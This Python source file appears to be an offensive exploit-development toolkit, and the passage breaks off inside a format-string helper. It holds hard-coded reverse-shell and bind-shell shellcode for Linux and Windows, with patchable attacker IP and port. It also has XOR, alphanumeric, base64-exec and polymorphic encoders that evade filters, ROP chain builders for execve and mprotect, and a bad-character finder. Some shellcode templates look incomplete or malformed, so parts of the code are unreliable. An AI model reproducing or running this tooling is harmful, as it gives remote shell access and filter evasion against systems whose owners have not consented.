#!/usr/bin/env python3
"""
===============================================================================
  FU PERSON :: EXPLOIT DEVELOPMENT TOOLKIT v1.0
  Professional Security Research  |  Binary Exploitation Utilities
  Pattern Generation / Shellcode / Encoding / ROP / Format Strings
===============================================================================

  AUTHORIZATION REQUIRED - DO NOT USE WITHOUT WRITTEN PERMISSION

  LEGAL NOTICE:
  Exploit development tools are intended for AUTHORIZED security research,
  CTF competitions, and penetration testing with explicit written consent.

  FLLC
  Government-Cleared Security Operations
===============================================================================
"""

import os
import sys
import re
import struct
import argparse
import itertools
import textwrap
import base64
import random
import string
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Sequence, Union
from pathlib import Path

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

try:
    import capstone
    HAS_CAPSTONE = True
except ImportError:
    HAS_CAPSTONE = False


# =============================================================================
#  ANSI COLORS & DISPLAY
# =============================================================================

class C:
    R   = "\033[0m"
    BLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"
    WHT = "\033[97m"

    @staticmethod
    def p(text: str):
        try:
            print(text)
        except UnicodeEncodeError:
            print(re.sub(r"\033\[[0-9;]*m", "", str(text)))

    @staticmethod
    def ok(msg: str):
        C.p(f"  {C.GRN}[+]{C.R} {msg}")

    @staticmethod
    def info(msg: str):
        C.p(f"  {C.BLU}[*]{C.R} {msg}")

    @staticmethod
    def warn(msg: str):
        C.p(f"  {C.YLW}[!]{C.R} {msg}")

    @staticmethod
    def err(msg: str):
        C.p(f"  {C.RED}[-]{C.R} {msg}")

    @staticmethod
    def banner(title: str):
        w = 70
        C.p(f"\n  {C.MAG}{C.BLD}{'=' * w}")
        C.p(f"  {'':>2}{title}")
        C.p(f"  {'=' * w}{C.R}")


# =============================================================================
#  DATA STRUCTURES
# =============================================================================

@dataclass
class Gadget:
    address: int
    instructions: List[str]
    raw_bytes: bytes = b""

    @property
    def disasm(self) -> str:
        return " ; ".join(self.instructions)

    def __repr__(self) -> str:
        return f"0x{self.address:08x}: {self.disasm}"


@dataclass
class ExploitPayload:
    buffer: bytes
    description: str = ""
    bad_chars_free: bool = True
    length: int = 0

    def __post_init__(self):
        self.length = len(self.buffer)

    def hex_dump(self, cols: int = 16) -> str:
        lines: List[str] = []
        for i in range(0, len(self.buffer), cols):
            chunk = self.buffer[i:i + cols]
            hx = " ".join(f"{b:02x}" for b in chunk)
            asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
            lines.append(f"  {i:08x}  {hx:<{cols * 3}}  {asc}")
        return "\n".join(lines)

    def c_array(self, var_name: str = "shellcode") -> str:
        chunks: List[str] = []
        for i in range(0, len(self.buffer), 12):
            part = self.buffer[i:i + 12]
            chunks.append('"' + "".join(f"\\x{b:02x}" for b in part) + '"')
        body = "\n".join(chunks)
        return f"unsigned char {var_name}[] =\n{body};\n// Length: {self.length}"

    def python_bytes(self, var_name: str = "shellcode") -> str:
        chunks: List[str] = []
        for i in range(0, len(self.buffer), 16):
            part = self.buffer[i:i + 16]
            chunks.append("b'" + "".join(f"\\x{b:02x}" for b in part) + "'")
        return f"{var_name}  = {chunks[0]}\n" + "\n".join(
            f"{var_name} += {c}" for c in chunks[1:]
        ) if len(chunks) > 1 else f"{var_name} = {chunks[0]}"


@dataclass
class EncodingResult:
    original_size: int
    encoded_size: int
    encoder_name: str
    payload: bytes
    decoder_stub: bytes = b""
    bad_chars_present: List[int] = field(default_factory=list)


# =============================================================================
#  PATTERN GENERATOR  -  De Bruijn cyclic patterns
# =============================================================================

class PatternGenerator:
    """Cyclic pattern generation and offset finding (De Bruijn-style sequences).

    Uses three character sets (uppercase, lowercase, digits) combined in
    a rotating triple to produce unique subsequences of 3 or 4 bytes,
    matching the classic Metasploit ``pattern_create`` layout for fast
    generation up to ~20k (32-bit) or ~700k+ (64-bit) unique bytes.
    """

    def __init__(self, arch: int = 64):
        self._arch = arch
        self._width = 8 if arch == 64 else 4
        self._sets: List[str] = [
            string.ascii_uppercase,
            string.ascii_lowercase,
            string.digits,
        ]

    def _generate_raw(self, length: int) -> bytes:
        """Build pattern by rotating through three character sets."""
        if self._width <= 4:
            return self._gen_3way(length)
        return self._gen_4way(length)

    def _gen_3way(self, length: int) -> bytes:
        """Classic 3-set pattern: Aa0, Aa1, Aa2 ... Ab0, Ab1 ..."""
        buf = bytearray()
        for a in self._sets[0]:
            for b in self._sets[1]:
                for c in self._sets[2]:
                    buf.append(ord(a))
                    buf.append(ord(b))
                    buf.append(ord(c))
                    if len(buf) >= length:
                        return bytes(buf[:length])
        return bytes(buf[:length])

    def _gen_4way(self, length: int) -> bytes:
        """Extended 4-set pattern for 64-bit: uses an extra lowercase rotation."""
        s0, s1, s2 = self._sets
        buf = bytearray()
        for a in s0:
            for b in s1:
                for c in s2:
                    for d in s1:
                        buf.append(ord(a))
                        buf.append(ord(b))
                        buf.append(ord(c))
                        buf.append(ord(d))
                        if len(buf) >= length:
                            return bytes(buf[:length])
        return bytes(buf[:length])

    def create(self, length: int) -> bytes:
        """Create a cyclic pattern of *length* bytes."""
        return self._generate_raw(length)

    def find_offset(self, value: Union[int, bytes, str],
                    endian: str = "little", length: int = 100000) -> int:
        """Return the offset of *value* inside a generated pattern, or -1."""
        pattern = self.create(length)

        if isinstance(value, str):
            if value.startswith("0x") or value.startswith("0X"):
                value = int(value, 16)
            else:
                needle = value.encode("ascii")
                return pattern.find(needle)

        if isinstance(value, int):
            needle = value.to_bytes(self._width, byteorder=endian)
        else:
            needle = bytes(value)

        return pattern.find(needle)

    def create_string(self, length: int) -> str:
        return self.create(length).decode("ascii", errors="replace")


# =============================================================================
#  SHELLCODE TEMPLATES
# =============================================================================

_SHELLCODE_TEMPLATES: Dict[str, Dict[str, bytes]] = {
    "linux-x64-reverse": {
        "code": (
            b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
            b"\x48\x97\x48\xb9\x02\x00"
            b"\x11\x5c"  # port placeholder (big-endian at offset 20-21)
            b"\x7f\x00\x00\x01"  # ip placeholder (offset 22-25)
            b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
            b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6"
            b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
            b"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
        ),
        "port_offset": 20,
        "ip_offset": 22,
    },
    "linux-x86-reverse": {
        "code": (
            b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
            b"\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xb3\x01\xcd\x80"
            b"\x89\xc6\x31\xc0\x50"
            b"\x68\x7f\x00\x00\x01"  # ip placeholder (offset 27-30)
            b"\x66\x68\x11\x5c"      # port placeholder (offset 33-34)
            b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1"
            b"\xb0\x66\xb3\x03\xcd\x80"
            b"\x31\xc9\xb1\x02\x89\xf3\xb0\x3f\xcd\x80\x49\x79\xf9"
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
            b"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
        ),
        "port_offset": 33,
        "ip_offset": 27,
    },
    "linux-x64-bind": {
        "code": (
            b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
            b"\x48\x97\x52\xc7\x04\x24\x02\x00"
            b"\x11\x5c"  # port placeholder (offset 20-21)
            b"\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05"
            b"\x6a\x01\x5e\x6a\x32\x58\x0f\x05"
            b"\x31\xf6\x6a\x2b\x58\x0f\x05"
            b"\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05"
            b"\x75\xf6\x6a\x3b\x58\x99"
            b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
            b"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
        ),
        "port_offset": 20,
    },
    "linux-x86-bind": {
        "code": (
            b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
            b"\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xb3\x01\xcd\x80"
            b"\x89\xc6"
            b"\x31\xc0\x50\x66\x68\x11\x5c"  # port placeholder (offset 26-27)
            b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1"
            b"\xb0\x66\xb3\x02\xcd\x80"
            b"\x31\xc0\x50\x56\x89\xe1\xb0\x66\xb3\x04\xcd\x80"
            b"\x31\xc0\x50\x50\x56\x89\xe1\xb0\x66\xb3\x05\xcd\x80"
            b"\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9"
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
            b"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
        ),
        "port_offset": 26,
    },
    "linux-x64-exec": {
        "code": (
            b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
            b"\x53\x48\x89\xe7\x68\x2d\x63\x00\x00"
            b"\x48\x89\xe6\x52\xe8"
            # command length placeholder at offset 28 (4 bytes LE)
            b"\x04\x00\x00\x00"
            b"\x00\x00\x00\x00"  # command placeholder starts at 32
        ),
        "cmd_offset": 32,
        "cmd_len_offset": 28,
    },
    "win-x64-reverse": {
        "code": (
            b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
            b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
            b"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
            b"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
            b"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
            b"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
            b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
            b"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
            b"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
            b"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
            b"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
            b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
            b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
            b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
            b"\x12\xe9\x57\xff\xff\xff"
        ),
    },
    "win-x86-reverse": {
        "code": (
            b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
            b"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
            b"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
            b"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
            b"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
            b"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
            b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
            b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
            b"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
            b"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d"
        ),
    },
}

# Egg hunter stubs
_EGG_HUNTER_LINUX_X86 = (
    b"\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\x6a\x21\x58\xcd\x80"
    b"\x3c\xf2\x61\x74\xed\xb8"
    # 4-byte tag appended here
)

_EGG_HUNTER_LINUX_X64 = (
    b"\x48\x31\xc9\x48\x81\xe9\xf0\xff\xff\xff\x48\x8d\x05\xef\xff"
    b"\xff\xff\x48\xbb"
    # 8-byte tag appended here
)

_EGG_HUNTER_WIN_X86 = (
    b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
    b"\x74\xef\xb8"
    # 4-byte tag appended here
)


# =============================================================================
#  SHELLCODE BUILDER
# =============================================================================

class ShellcodeBuilder:
    """Generate and customise shellcode payloads from built-in templates."""

    @staticmethod
    def _patch_port(template: bytes, offset: int, port: int) -> bytes:
        buf = bytearray(template)
        buf[offset:offset + 2] = struct.pack(">H", port)
        return bytes(buf)

    @staticmethod
    def _patch_ip(template: bytes, offset: int, host: str) -> bytes:
        parts = host.split(".")
        if len(parts) != 4:
            raise ValueError(f"Invalid IPv4 address: {host}")
        buf = bytearray(template)
        buf[offset:offset + 4] = bytes(int(p) for p in parts)
        return bytes(buf)

    @staticmethod
    def _key_for(arch: str, platform: str, kind: str) -> str:
        return f"{platform}-{arch}-{kind}"

    def reverse_shell(self, host: str, port: int,
                      arch: str = "x64", platform: str = "linux") -> bytes:
        key = self._key_for(arch, platform, "reverse")
        tmpl = _SHELLCODE_TEMPLATES.get(key)
        if tmpl is None:
            raise ValueError(f"No reverse-shell template for {key}")
        code = bytearray(tmpl["code"])
        if "port_offset" in tmpl:
            struct.pack_into(">H", code, tmpl["port_offset"], port)
        if "ip_offset" in tmpl:
            parts = host.split(".")
            for i, p in enumerate(parts):
                code[tmpl["ip_offset"] + i] = int(p)
        return bytes(code)

    def bind_shell(self, port: int,
                   arch: str = "x64", platform: str = "linux") -> bytes:
        key = self._key_for(arch, platform, "bind")
        tmpl = _SHELLCODE_TEMPLATES.get(key)
        if tmpl is None:
            raise ValueError(f"No bind-shell template for {key}")
        code = bytearray(tmpl["code"])
        if "port_offset" in tmpl:
            struct.pack_into(">H", code, tmpl["port_offset"], port)
        return bytes(code)

    def exec_command(self, cmd: str,
                     arch: str = "x64", platform: str = "linux") -> bytes:
        key = self._key_for(arch, platform, "exec")
        tmpl = _SHELLCODE_TEMPLATES.get(key)
        if tmpl is None:
            return self._generic_exec(cmd)
        code = bytearray(tmpl["code"])
        cmd_bytes = cmd.encode("ascii") + b"\x00"
        if "cmd_len_offset" in tmpl:
            struct.pack_into("<I", code, tmpl["cmd_len_offset"], len(cmd_bytes))
        if "cmd_offset" in tmpl:
            off = tmpl["cmd_offset"]
            code = code[:off] + bytearray(cmd_bytes) + code[off + len(cmd_bytes):]
        return bytes(code)

    @staticmethod
    def _generic_exec(cmd: str) -> bytes:
        """Fallback: construct a minimal /bin/sh -c <cmd> shellcode frame."""
        stub = (
            b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
            b"\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52"
        )
        cmd_bytes = cmd.encode("ascii") + b"\x00"
        call_stub = b"\xe8" + struct.pack("<i", len(cmd_bytes))
        tail = b"\x56\x57\x48\x89\xe6\x0f\x05"
        return stub + call_stub + cmd_bytes + tail

    @staticmethod
    def null_free(shellcode: bytes) -> bytes:
        """Attempt to remove null bytes via XOR-based self-decoding wrapper."""
        if b"\x00" not in shellcode:
            return shellcode
        for key in range(1, 256):
            encoded = bytes(b ^ key for b in shellcode)
            if b"\x00" not in encoded and key not in encoded:
                decoder = (
                    b"\xeb\x0d\x5e\x31\xc9\xb1" +
                    bytes([len(shellcode)]) +
                    b"\x80\x36" + bytes([key]) +
                    b"\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
                )
                return decoder + encoded
        return shellcode


# =============================================================================
#  PAYLOAD ENCODER
# =============================================================================

class PayloadEncoder:
    """Multi-strategy shellcode encoding engine."""

    @staticmethod
    def xor_encode(shellcode: bytes, key: Union[int, bytes],
                   bad_chars: Optional[List[int]] = None) -> EncodingResult:
        if isinstance(key, int):
            key = bytes([key])
        key_len = len(key)
        encoded = bytes(shellcode[i] ^ key[i % key_len] for i in range(len(shellcode)))

        bad_found = []
        if bad_chars:
            bad_found = sorted(set(b for b in encoded if b in bad_chars))

        decoder_stub = PayloadEncoder._xor_decoder_stub(key)

        return EncodingResult(
            original_size=len(shellcode),
            encoded_size=len(decoder_stub) + len(encoded),
            encoder_name=f"xor(key={''.join(f'{b:02x}' for b in key)})",
            payload=decoder_stub + encoded,
            decoder_stub=decoder_stub,
            bad_chars_present=bad_found,
        )

    @staticmethod
    def _xor_decoder_stub(key: bytes) -> bytes:
        if len(key) == 1:
            return (
                b"\xeb\x09\x5e\x80\x36" + key +
                b"\x46\x80\x3e" + key +
                b"\x75\xf7\xeb\x05\xe8\xf2\xff\xff\xff"
            )
        stub = (
            b"\xeb\x11\x5e\x31\xc9\xb1" + bytes([len(key)]) +
            b"\x56\x5f\x80\x36" + bytes([key[0]]) +
            b"\x46\xe2\xfa\xeb\x05\xe8\xea\xff\xff\xff"
        )
        return stub

    @staticmethod
    def alphanumeric_encode(shellcode: bytes) -> EncodingResult:
        """Encode shellcode into printable alphanumeric characters."""
        encoded_parts: List[str] = []
        for byte in shellcode:
            hi = (byte >> 4) & 0x0F
            lo = byte & 0x0F
            encoded_parts.append(chr(hi + 0x41))
            encoded_parts.append(chr(lo + 0x41))
        encoded = "".join(encoded_parts).encode("ascii")

        decoder_stub = (
            b"\xeb\x12\x5e\x31\xc9\x8a\x06\x2c\x41\xc0\xe0\x04"
            b"\x46\x02\x06\x2c\x41\x46\x88\x01\x41\xe2\xef"
            b"\xeb\x05\xe8\xe9\xff\xff\xff"
        )

        return EncodingResult(
            original_size=len(shellcode),
            encoded_size=len(decoder_stub) + len(encoded),
            encoder_name="alphanumeric",
            payload=decoder_stub + encoded,
            decoder_stub=decoder_stub,
        )

    @staticmethod
    def base64_wrap(shellcode: bytes) -> EncodingResult:
        """Base64-encode shellcode with a Python-based decoder stub."""
        b64 = base64.b64encode(shellcode)
        decoder_script = (
            b"import base64,ctypes;exec(base64.b64decode(b'" + b64 + b"'))"
        )
        return EncodingResult(
            original_size=len(shellcode),
            encoded_size=len(decoder_script),
            encoder_name="base64_wrap",
            payload=decoder_script,
            decoder_stub=b"",
        )

    @staticmethod
    def polymorphic_wrapper(shellcode: bytes,
                            nop_sled: int = 16) -> EncodingResult:
        """Wrap shellcode with random NOP-equivalent sleds and junk instructions."""
        nop_equivalents = [
            b"\x90",           # nop
            b"\x40\x48",       # inc eax; dec eax (x86)
            b"\x87\xc0",       # xchg eax, eax
            b"\x86\xc9",       # xchg cl, cl
            b"\x41\x49",       # inc ecx; dec ecx
            b"\x43\x4b",       # inc ebx; dec ebx
            b"\x87\xdb",       # xchg ebx, ebx
        ]
        junk_blocks = [
            b"\x50\x58",       # push eax; pop eax
            b"\x53\x5b",       # push ebx; pop ebx
            b"\x51\x59",       # push ecx; pop ecx
            b"\x52\x5a",       # push edx; pop edx
            b"\x55\x5d",       # push ebp; pop ebp
        ]

        sled = b""
        remaining = nop_sled
        while remaining > 0:
            choice = random.choice(nop_equivalents)
            if len(choice) <= remaining:
                sled += choice
                remaining -= len(choice)
            else:
                sled += b"\x90" * remaining
                remaining = 0

        prefix_junk = b"".join(random.choices(junk_blocks, k=random.randint(1, 3)))
        suffix_junk = b"".join(random.choices(junk_blocks, k=random.randint(1, 3)))

        wrapped = prefix_junk + sled + shellcode + suffix_junk
        return EncodingResult(
            original_size=len(shellcode),
            encoded_size=len(wrapped),
            encoder_name="polymorphic",
            payload=wrapped,
        )

    @classmethod
    def chain_encode(cls, shellcode: bytes,
                     encoders: List[Tuple[str, dict]]) -> EncodingResult:
        """Apply multiple encoding passes in sequence.

        *encoders* is a list of (name, kwargs) tuples.  Supported names:
        ``xor``, ``alphanumeric``, ``base64``, ``polymorphic``.
        """
        current = shellcode
        chain_names: List[str] = []
        total_stub = b""

        dispatch = {
            "xor": cls.xor_encode,
            "alphanumeric": cls.alphanumeric_encode,
            "base64": cls.base64_wrap,
            "polymorphic": cls.polymorphic_wrapper,
        }

        for name, kwargs in encoders:
            fn = dispatch.get(name)
            if fn is None:
                raise ValueError(f"Unknown encoder: {name}")
            if name == "xor":
                result = fn(current, **kwargs)
            else:
                result = fn(current, **kwargs)
            current = result.payload
            chain_names.append(result.encoder_name)
            total_stub += result.decoder_stub

        return EncodingResult(
            original_size=len(shellcode),
            encoded_size=len(current),
            encoder_name=" -> ".join(chain_names),
            payload=current,
            decoder_stub=total_stub,
        )

    @staticmethod
    def filter_bad_chars(payload: bytes,
                         bad_chars: List[int]) -> Tuple[bool, List[int]]:
        """Check if *payload* contains any bad characters."""
        found = sorted(set(b for b in payload if b in bad_chars))
        return len(found) == 0, found


# =============================================================================
#  BAD CHARACTER FINDER
# =============================================================================

class BadCharFinder:
    """Identify bad characters by comparing sent vs. received buffers."""

    @staticmethod
    def generate_test_string() -> bytes:
        return bytes(range(256))

    @staticmethod
    def find_bad_chars(sent: bytes, received: bytes) -> List[int]:
        """Compare *sent* to *received* and return the list of bad byte values."""
        bad: List[int] = []
        recv_idx = 0
        for send_idx in range(len(sent)):
            if recv_idx >= len(received):
                bad.extend(range(sent[send_idx], 256))
                break
            if sent[send_idx] != received[recv_idx]:
                bad.append(sent[send_idx])
            else:
                recv_idx += 1
        return sorted(set(bad))

    @staticmethod
    def suggest_encoding(bad_chars: List[int]) -> str:
        if not bad_chars:
            return "No encoding needed - no bad characters detected."
        suggestions: List[str] = []
        if 0x00 in bad_chars and len(bad_chars) <= 3:
            suggestions.append("Single-byte XOR (try keys that avoid the bad set)")
        if all(b < 0x20 or b > 0x7e for b in bad_chars if b != 0x00):
            suggestions.append("Alphanumeric encoding (all bad chars are non-printable)")
        if len(bad_chars) > 10:
            suggestions.append("Multi-byte XOR with key rotation")
            suggestions.append("Alphanumeric encoder (restrictive bad-char set)")
        if len(bad_chars) <= 10:
            for key_candidate in range(1, 256):
                if key_candidate not in bad_chars:
                    conflicts = [b ^ key_candidate for b in range(256)
                                 if (b ^ key_candidate) in bad_chars]
                    if not conflicts:
                        suggestions.append(
                            f"XOR key 0x{key_candidate:02x} avoids all bad chars"
                        )
                        break
        if not suggestions:
            suggestions.append("Chain encoding (XOR + alphanumeric)")
        bc_str = ", ".join(f"0x{b:02x}" for b in bad_chars)
        return (
            f"Bad characters ({len(bad_chars)}): {bc_str}\n"
            f"  Recommended strategies:\n" +
            "\n".join(f"    - {s}" for s in suggestions)
        )


# =============================================================================
#  ROP HELPER
# =============================================================================

class ROPHelper:
    """Basic ROP gadget search in raw binaries / ELF / PE files."""

    RET_OPCODES = {b"\xc3", b"\xcb", b"\xc2", b"\xca"}
    COMMON_PATTERNS = {
        "pop rdi; ret":    rb"\x5f\xc3",
        "pop rsi; ret":    rb"\x5e\xc3",
        "pop rdx; ret":    rb"\x5a\xc3",
        "pop rax; ret":    rb"\x58\xc3",
        "pop rbx; ret":    rb"\x5b\xc3",
        "pop rcx; ret":    rb"\x59\xc3",
        "pop rbp; ret":    rb"\x5d\xc3",
        "pop rsp; ret":    rb"\x5c\xc3",
        "ret":             rb"\xc3",
        "syscall; ret":    rb"\x0f\x05\xc3",
        "pop rdi; pop rsi; ret": rb"\x5f\x5e\xc3",
        "leave; ret":      rb"\xc9\xc3",
        "nop; ret":        rb"\x90\xc3",
        "xor eax, eax; ret": rb"\x31\xc0\xc3",
        "jmp rsp":         rb"\xff\xe4",
        "jmp esp":         rb"\xff\xe4",
        "call rsp":        rb"\xff\xd4",
        "call esp":        rb"\xff\xd4",
    }

    def __init__(self):
        self._cs = None
        if HAS_CAPSTONE:
            self._cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)

    def find_gadgets(self, binary_path: str,
                     max_depth: int = 5) -> List[Gadget]:
        data = Path(binary_path).read_bytes()
        gadgets: List[Gadget] = []
        seen: set = set()

        for i, byte in enumerate(data):
            if data[i:i + 1] not in self.RET_OPCODES:
                continue
            for depth in range(1, max_depth + 1):
                start = i - depth
                if start < 0:
                    continue
                snippet = data[start:i + 1]
                if snippet in seen:
                    continue
                seen.add(snippet)

                instrs = self._disassemble(snippet, start)
                if instrs and instrs[-1].lower().startswith("ret"):
                    gadgets.append(Gadget(
                        address=start,
                        instructions=instrs,
                        raw_bytes=snippet,
                    ))
        return gadgets

    def find_specific(self, binary_path: str,
                      pattern: str) -> List[Gadget]:
        data = Path(binary_path).read_bytes()
        results: List[Gadget] = []

        regex = self.COMMON_PATTERNS.get(pattern.lower().strip())
        if regex is None:
            try:
                regex = re.compile(pattern.encode("latin-1") if isinstance(pattern, str) else pattern)
            except Exception:
                regex = re.escape(pattern.encode("latin-1"))

        if isinstance(regex, bytes):
            regex_c = re.compile(re.escape(regex))
        else:
            regex_c = re.compile(regex)

        for m in regex_c.finditer(data):
            addr = m.start()
            raw = m.group()
            instrs = self._disassemble(raw, addr)
            results.append(Gadget(address=addr, instructions=instrs, raw_bytes=raw))
        return results

    def build_chain(self, gadgets: Dict[str, Gadget],
                    goal: str = "execve") -> List[Tuple[int, str]]:
        """Arrange gadgets for common exploitation goals.

        *gadgets* maps canonical names (``pop rdi``, ``pop rsi``, etc.) to
        :class:`Gadget` instances.  Returns an ordered list of
        ``(address, description)`` pairs.
        """
        chain: List[Tuple[int, str]] = []

        if goal == "execve":
            required = ["pop rdi; ret", "pop rsi; ret", "pop rdx; ret", "syscall; ret"]
            bin_sh = 0x0068732f6e69622f  # /bin/sh
            for name in required:
                g = gadgets.get(name)
                if g is None:
                    chain.append((0xDEADBEEF, f"MISSING: {name}"))
                else:
                    chain.append((g.address, name))
                if name == "pop rdi; ret":
                    chain.append((bin_sh, "/bin/sh address"))
                elif name == "pop rsi; ret":
                    chain.append((0, "argv = NULL"))
                elif name == "pop rdx; ret":
                    chain.append((0, "envp = NULL"))

        elif goal == "mprotect":
            required = ["pop rdi; ret", "pop rsi; ret", "pop rdx; ret", "pop rax; ret",
                         "syscall; ret"]
            for name in required:
                g = gadgets.get(name)
                if g is None:
                    chain.append((0xDEADBEEF, f"MISSING: {name}"))
                else:
                    chain.append((g.address, name))
                if name == "pop rdi; ret":
                    chain.append((0x400000, "page-aligned address"))
                elif name == "pop rsi; ret":
                    chain.append((0x1000, "size = 0x1000"))
                elif name == "pop rdx; ret":
                    chain.append((7, "PROT_READ|PROT_WRITE|PROT_EXEC"))
                elif name == "pop rax; ret":
                    chain.append((10, "mprotect syscall number"))
        else:
            raise ValueError(f"Unknown goal: {goal}")

        return chain

    def gadget_to_string(self, gadget: Gadget) -> str:
        addr = f"0x{gadget.address:08x}"
        raw = " ".join(f"{b:02x}" for b in gadget.raw_bytes)
        return f"{addr}:  {raw:<30s}  {gadget.disasm}"

    def _disassemble(self, data: bytes, offset: int = 0) -> List[str]:
        if self._cs is not None:
            instrs = []
            for insn in self._cs.disasm(data, offset):
                instrs.append(f"{insn.mnemonic} {insn.op_str}".strip())
            return instrs
        return self._simple_disasm(data)

    @staticmethod
    def _simple_disasm(data: bytes) -> List[str]:
        """Minimal opcode-table disassembler (no capstone)."""
        single_byte = {
            0x58: "pop rax", 0x59: "pop rcx", 0x5a: "pop rdx",
            0x5b: "pop rbx", 0x5c: "pop rsp", 0x5d: "pop rbp",
            0x5e: "pop rsi", 0x5f: "pop rdi",
            0x50: "push rax", 0x51: "push rcx", 0x52: "push rdx",
            0x53: "push rbx", 0x54: "push rsp", 0x55: "push rbp",
            0x56: "push rsi", 0x57: "push rdi",
            0xc3: "ret", 0xc9: "leave", 0x90: "nop",
            0xcc: "int3",
        }
        two_byte = {
            (0x0f, 0x05): "syscall",
            (0x31, 0xc0): "xor eax, eax",
            (0x31, 0xc9): "xor ecx, ecx",
            (0x31, 0xd2): "xor edx, edx",
            (0x31, 0xf6): "xor esi, esi",
            (0x31, 0xff): "xor edi, edi",
            (0xff, 0xe4): "jmp rsp",
            (0xff, 0xd4): "call rsp",
            (0x89, 0xe5): "mov ebp, esp",
        }
        instrs: List[str] = []
        i = 0
        while i < len(data):
            if i + 1 < len(data) and (data[i], data[i + 1]) in two_byte:
                instrs.append(two_byte[(data[i], data[i + 1])])
                i += 2
            elif data[i] in single_byte:
                instrs.append(single_byte[data[i]])
                i += 1
            else:
                instrs.append(f"db 0x{data[i]:02x}")
                i += 1
        return instrs


# =============================================================================
#  FORMAT STRING HELPER
# =============================================================================

class FormatStringHelper:
    """Format-string exploit construction utilities."""

    @staticmethod
    def calculate_offset(response: str, marker: str = "AAAA") -> int:
        """Determine the parameter offset where *marker* appears on the stack.

        Feed ``AAAA%p.%p.%p...`` to the vulnerable program and pass the
        response string here.  Returns the 1-based parameter index.
        """
        needle = "0x" + marker.encode().hex()
        parts = response.replace("(nil)", "0x0").split(".")
        for idx, part in enumerate(parts):
            cleaned = part.strip().lower()
            if needle.lower() in cleaned:
                return idx + 1
        needle_le = "0x" + marker.encode()[::-1].hex()
        for idx, part in enumerate(parts):
            cleaned = part.strip().lower()
